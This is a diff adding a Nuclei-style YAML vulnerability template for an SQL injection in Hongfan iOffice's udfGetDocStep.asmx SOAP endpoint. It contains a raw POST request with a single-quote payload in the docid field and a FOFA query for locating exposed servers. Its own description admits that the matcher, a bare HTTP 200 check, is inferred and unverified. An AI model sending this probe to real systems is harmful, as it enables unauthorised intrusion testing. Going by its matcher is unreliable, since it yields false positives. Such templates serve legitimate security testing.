@@ -1,0 +1,21 @@
+id: poc-icpt1seo448veugb
+info:
+  name: 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/icpt1seo448veugb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: icpt1seo448veugb
+    fofa: body="./config/pc-app-config.js" && title="HFOffice" || app="红帆-ioffice"
+http:
+- raw:
+  - "POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/GetDocStep\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n    <GetDocStep xmlns=\"http://tempuri.org/\">\n        <docid>1'</docid>\n    </GetDocStep>\n    </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
